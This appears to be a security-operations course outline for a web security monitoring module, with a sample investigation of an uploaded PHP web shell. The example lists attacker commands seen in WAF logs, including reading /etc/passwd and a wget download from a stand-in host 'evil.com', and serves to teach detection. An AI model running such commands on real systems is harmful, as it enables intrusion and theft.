Module 8: Web Security Monitoring
Sub-Domains / Rooms
  • Detecting Web Shells — Identify web shells by monitoring for unusual file uploads, command execution via web requests, and abnormal process parents.
  • Web Attack Investigation Rooms — Investigate SQL injection, XSS, path traversal, and file upload abuse from web server and WAF logs.
Example Investigation: A WAF alerts on a request: POST /uploads/shell.php?cmd=whoami. The analyst checks the web server access log and finds the file was uploaded 5 minutes earlier via POST /uploads/ with filename shell.php. The WAF log shows the same IP executing commands: id, ls -la, cat /etc/passwd, wget http://evil.com/tools.sh. The analyst isolates the web server, removes the web shell, and patches the file upload vulnerability.
Key Skills Learned
  • Web shell detection and analysis
  • Web application log analysis
  • SQL injection and XSS pattern recognition
  • WAF log correlation
